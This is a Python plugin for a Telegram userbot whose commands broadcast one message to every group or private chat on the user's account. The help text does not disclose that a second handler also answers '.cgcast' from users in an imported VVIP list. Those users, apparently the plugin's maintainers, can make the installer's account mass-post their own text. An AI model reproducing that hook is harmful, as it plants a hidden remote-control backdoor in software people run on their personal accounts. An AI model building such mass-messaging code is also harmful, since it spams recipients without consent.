# Ultroid - UserBot
# Copyright (C) 2020 TeamUltroid
#
# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.
#
# Ported by Koala @manusiarakitann
# Recode by @mrismanaziz
# FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
# t.me/SharingUserbot & t.me/Lunatic0de

from userbot import VVIP, CMD_HELP
from userbot.events import register

GCAST_BLACKLIST = [
    -1001473548283,  # SharingUserbot
    -1001638078842,  # RuangDiskusi
    -1001692751821,  # ramsupport
    -1001459812644,  # GeezSupport
    -1001538752127,  # AbingSupport

]


@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
@register(incoming=True, from_users=VVIP,
          pattern=r"^\.cgcast(?: |$)(.*)")
async def gcast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("𝙿𝙴𝚂𝙰𝙽 𝙼𝙰𝙽𝙰 𝚈𝙰𝙽𝙶 𝙼𝙰𝚄 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙹𝙸𝙽𝙺 🗿")
        return
    kk = await event.edit("`𝚃𝚄𝙽𝙶𝙶𝚄 𝙱𝙴𝙽𝚃𝙰𝚁 𝚃𝙾𝙳 𝙻𝙰𝙶𝙸 𝙶𝚄𝙰 𝙺𝙸𝚁𝙸𝙼, 𝙺𝙰𝙻𝙾 𝙻𝙸𝙼𝙸𝚃 𝙳𝙴𝙰𝙺 𝙰𝙹𝙰 𝙰𝙺𝚄𝙽-𝙽𝚈𝙰 🗿. . .`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
                elif chat not in GCAST_BLACKLIST:
                    pass
            except BaseException:
                er += 1
    await kk.edit(
        f"𝚄𝙳𝙰𝙷 𝙶𝚄𝙰 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 `{done}` 𝙶𝚁𝚄𝙿 𝚈𝙰 𝚃𝙾𝙳, 𝙶𝙰𝙶𝙰𝙻 𝚃𝙴𝚁𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 `{er}` 𝙶𝚁𝚄𝙿"
    )


@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
async def gucast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("**Berikan Sebuah Pesan atau Reply**")
        return
    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                done += 1
                await event.client.send_message(chat, msg)
            except BaseException:
                er += 1
    await kk.edit(
        f"**Berhasil Mengirim Pesan Ke** `{done}` **chats, Gagal Mengirim Pesan Ke** `{er}` **chats**"
    )


CMD_HELP.update(
    {
        "gcast": "**Plugin : **`gcast`\
        \n\n  •  **Syntax :** `.gcast` <text/reply media>\
        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
    "
    }
)


CMD_HELP.update(
    {
        "gucast": "**Plugin : **`gucast`\
        \n\n  •  **Syntax :** `.gucast` <text/reply media>\
        \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
    "
    }
)
